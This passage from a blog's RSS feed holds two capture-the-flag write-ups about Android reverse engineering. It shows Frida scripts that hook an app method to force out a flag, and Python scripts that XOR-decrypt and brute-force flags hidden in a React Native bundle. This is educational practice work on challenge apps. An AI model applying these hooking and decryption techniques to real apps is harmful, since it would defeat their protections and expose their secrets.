In the switcher code we can see the method &lt;code>run&lt;/code>. Instead of trying to figure out what each line does, I saw it easier to just hook into
this method and manipulate the &lt;code>i&lt;/code> value, which at this point I believe is the 20000 value.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot5.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>I found two ways to solve this with frida, the run method was actually the one returning the flag:&lt;/p>
&lt;p>First one is to hook into the method and change the input value &lt;code>i&lt;/code> as it gets called.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hooking...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">run&lt;/span>.&lt;span style="color:#a6e22e">overload&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">implementation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">x&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Original Input: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Original return: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Modified Input: 0&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Modified return: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When I click on the padlock in the app, the flag is given.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot6.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>Second one is to just initialize the switcher object ourselves and call the run method directly with our input without hooking.
This way I don&amp;rsquo;t need to interact with the app.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcherInstance&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span>.&lt;span style="color:#a6e22e">$new&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Flag: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">switcherInstance&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot7.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>&lt;code>Flag: RaziCTF{IN_HATE_0F_RUNN!NG_L0CK5}&lt;/code>&lt;/p>
&lt;h1 id="conclusion">Conclusion&lt;/h1>
&lt;p>This was a good learning experience for me especially the second part which is quicker and has less code.&lt;/p>
&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item><item><title>CyberSpaceKenya CTF: ZuluMeats3</title><link>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</link><pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>I recently worked on a CTF challenge by &lt;a href="https://twitter.com/CyberSpaceKenya" target="_blank" rel="noopener">CyberSpace Kenya&lt;/a>
which I ended up winning. This is a writeup on how I solved the challenge. We were provided with an android app to reverse engineer and submit 3 flags.&lt;/p>
&lt;h2 id="flag-3">Flag 3&lt;/h2>
&lt;p>I haven&amp;rsquo;t done tons of mobile app reverse engineering but as I was learning about the subject in previous challenges I found this 2-step approach to work well:&lt;/p>
&lt;ul>
&lt;li>Extracting the apk contents with apktool&lt;/li>
&lt;li>Reversing the app code with jadx-gui&lt;/li>
&lt;/ul>
&lt;p>Using apktool is pretty simple just run this command on the apk:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&amp;gt; apktool d cyberspace-ctf.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This generates files in a folder cyberspace-ctf as below:&lt;/p>
&lt;pre tabindex="0">&lt;code>.
├── AndroidManifest.xml
├── apktool.yml
├── assets
├── lib
├── original
├── res
├── smali
└── unknown
&lt;/code>&lt;/pre>&lt;p>Checking the AndroidManifest.xml and res/values/strings.xml doesn&amp;rsquo;t reveal any flag. Usually grepping recursively through the apk files for interesting names would hint at something. After a few tries with the words flag, flag1, flag2, flag3 I got some interesting output.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf1.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
&lt;p>Without much thought I opened jadx to find more mentions of that ValidateFlag3 and found the code.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf2.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
&lt;p>Reading through the code I was able to figure out that the validate function does the following:&lt;/p>
&lt;ol>
&lt;li>takes our input&lt;/li>
&lt;li>xor encrypts it with a key(which is generated by getKey() function)&lt;/li>
&lt;li>base64 encodes it&lt;/li>
&lt;li>checks if it is equal to the hardcoded flag3.&lt;/li>
&lt;/ol>
&lt;p>From previous experience I know that with xor encryption if you have the key and the encrypted data getting the plain text output is simple. Let me illustrate:&lt;/p>
&lt;pre tabindex="0">&lt;code>encrypted = key ^ plaintext
plaintext = key ^ encrypted
&lt;/code>&lt;/pre>&lt;p>Getting the code to work in java isn&amp;rsquo;t as easy so I decided to use python and script the solution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;hUZAf9gFIARRFTAvKRDs8A==&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gp9jPELztMsd51Ih81gO0Q==&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data1 &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(key1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data2 &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(key2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(data2)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key&lt;span style="color:#f92672">.&lt;/span>append(data1[i] &lt;span style="color:#f92672">^&lt;/span> data2[i])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>decodedflag &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>input &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(flag3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>encryptedFlag &lt;span style="color:#f92672">=&lt;/span> input
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(encryptedFlag)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> decodedflag&lt;span style="color:#f92672">.&lt;/span>append(encryptedFlag[i] &lt;span style="color:#f92672">^&lt;/span> key[i &lt;span style="color:#f92672">%&lt;/span> len(key)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b &lt;span style="color:#f92672">=&lt;/span> [chr(s) &lt;span style="color:#66d9ef">for&lt;/span> s &lt;span style="color:#f92672">in&lt;/span> decodedflag]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(b))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag 3: &lt;code>CFI{plz_no_secret_in_java_code}&lt;/code>&lt;/p>
&lt;p>Since I found flag3 first I must have missed some stuff.&lt;/p>
&lt;h2 id="flag-1">Flag 1&lt;/h2>
&lt;p>Refering back to my earlier screenshot, after performing the grep there&amp;rsquo;s some base64 encoded data which I should have been more keen to look at!&lt;/p>
&lt;p>base64:&lt;/p>
&lt;pre tabindex="0">&lt;code>Q1NfS0V7YmFzZTY0X2VuY29kaW5nX2lzX25vdF90aGF0X3NlY3VyZX0=
&lt;/code>&lt;/pre>&lt;p>Flag 1: &lt;code>CS_KE{base64_encoding_is_not_that_secure}&lt;/code>&lt;/p>
&lt;h2 id="flag-2">Flag 2&lt;/h2>
&lt;p>Now flag 2 was the last to find. Since most of the clues we have been finding were in that &lt;code>assets/index.android.bundle&lt;/code> file let me have a look at it.&lt;/p>
&lt;p>&lt;del>Something I noted was that jadx didn’t find this file, that why the approach to use two tools is good IMO.&lt;/del> A friend of mine has pointed out that it was actually there under Resources/assets on the jadx ui, nevertheless using two or more tools for analysis is still a good practice IMO. There is a lot of code in this file that is not easily readable, so I just googled what this file is.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf3.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
&lt;p>I found that this file contains minified-javascript, it is created when an android app is developed using react. We already saw mentions of react when reading the code in jadx.&lt;/p>
&lt;p>Reading the code in it&amp;rsquo;s minified form isn&amp;rsquo;t easy so js-beautifier to the rescue. I then opened the readable version in vs code and searched for the validateflag function again.&lt;/p>
&lt;p>I landed here and we can clearly see the function that contained the base64 and the the other one that called flag3, due to their order flag 2 is what is left.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf4.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
&lt;p>I took the same approach to porting the code to python as it is easier for me to work with. I had to do a bit of googling to understand the js flow but came up with this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">f&lt;/span>(n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> r &lt;span style="color:#f92672">in&lt;/span> range(len(n)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> r:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">-=&lt;/span> len(n) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> u &lt;span style="color:#f92672">=&lt;/span> ord(n[r]) &lt;span style="color:#f92672">+&lt;/span> t
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e&lt;span style="color:#f92672">.&lt;/span>append(str(u))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> e
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>At the end, the output of the function is checked if it is equal to that list of numbers which is a hex representation of characters. Instead of trying to undo the transformation that was going on in the function where they add 13&amp;hellip; which I tried for a few hours and failed, better to bruteforce all possibilities.&lt;/p>
&lt;p>I came up with this script for that:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">64&lt;/span>,&lt;span style="color:#ae81ff">80&lt;/span>,&lt;span style="color:#ae81ff">78&lt;/span>,&lt;span style="color:#ae81ff">141&lt;/span>,&lt;span style="color:#ae81ff">124&lt;/span>,&lt;span style="color:#ae81ff">124&lt;/span>,&lt;span style="color:#ae81ff">123&lt;/span>,&lt;span style="color:#ae81ff">151&lt;/span>,&lt;span style="color:#ae81ff">144&lt;/span>,&lt;span style="color:#ae81ff">141&lt;/span>,&lt;span style="color:#ae81ff">134&lt;/span>,&lt;span style="color:#ae81ff">166&lt;/span>,&lt;span style="color:#ae81ff">146&lt;/span>,&lt;span style="color:#ae81ff">158&lt;/span>,&lt;span style="color:#ae81ff">148&lt;/span>,&lt;span style="color:#ae81ff">172&lt;/span>,&lt;span style="color:#ae81ff">158&lt;/span>,&lt;span style="color:#ae81ff">192&lt;/span>,&lt;span style="color:#ae81ff">166&lt;/span>,&lt;span style="color:#ae81ff">197&lt;/span>,&lt;span style="color:#ae81ff">176&lt;/span>,&lt;span style="color:#ae81ff">204&lt;/span>,&lt;span style="color:#ae81ff">190&lt;/span>,&lt;span style="color:#ae81ff">210&lt;/span>,&lt;span style="color:#ae81ff">209&lt;/span>,&lt;span style="color:#ae81ff">201&lt;/span>,&lt;span style="color:#ae81ff">206&lt;/span>,&lt;span style="color:#ae81ff">229&lt;/span>,&lt;span style="color:#ae81ff">204&lt;/span>,&lt;span style="color:#ae81ff">232&lt;/span>,&lt;span style="color:#ae81ff">228&lt;/span>,&lt;span style="color:#ae81ff">246&lt;/span>,&lt;span style="color:#ae81ff">220&lt;/span>,&lt;span style="color:#ae81ff">253&lt;/span>,&lt;span style="color:#ae81ff">234&lt;/span>,&lt;span style="color:#ae81ff">245&lt;/span>,&lt;span style="color:#ae81ff">258&lt;/span>,&lt;span style="color:#ae81ff">268&lt;/span>,&lt;span style="color:#ae81ff">250&lt;/span>,&lt;span style="color:#ae81ff">262&lt;/span>,&lt;span style="color:#ae81ff">282&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>all &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">41&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> [a[i] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(a))]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">f&lt;/span>(n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> r &lt;span style="color:#f92672">in&lt;/span> range(len(n)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> r:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">-=&lt;/span> len(n) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> u &lt;span style="color:#f92672">=&lt;/span> ord(n[r]) &lt;span style="color:#f92672">+&lt;/span> t
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e&lt;span style="color:#f92672">.&lt;/span>append(str(u))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(flag)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(len(all)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag[i] &lt;span style="color:#f92672">=&lt;/span> all[j]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out &lt;span style="color:#f92672">=&lt;/span> f(flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> out[i] &lt;span style="color:#f92672">==&lt;/span> str(k[i]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(flag))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag 2: &lt;code>CFI{obfuscated_javascript_is_not_secured}&lt;/code>&lt;/p>
&lt;h1 id="conclusion">Conclusion&lt;/h1>
&lt;p>This was a good ctf for practising some code review. I also had never played around with an app made with react so that was something I learnt.&lt;/p>
&lt;p>I&amp;rsquo;d like to thank the CyberSpace Kenya team for putting up the challenge as well as &lt;a href="https://twitter.com/ZuluMeats" target="_blank" rel="noopener">ZuluMeats&lt;/a>
for the prize.&lt;/p>
&lt;p>You can find more challenges on their website: &lt;a href="https://ctf.cyberspace.co.ke" target="_blank" rel="noopener">https://ctf.cyberspace.co.ke&lt;/a>
&lt;/p>
&lt;p>For any questions you can reach me on Twitter.&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item></channel></rss>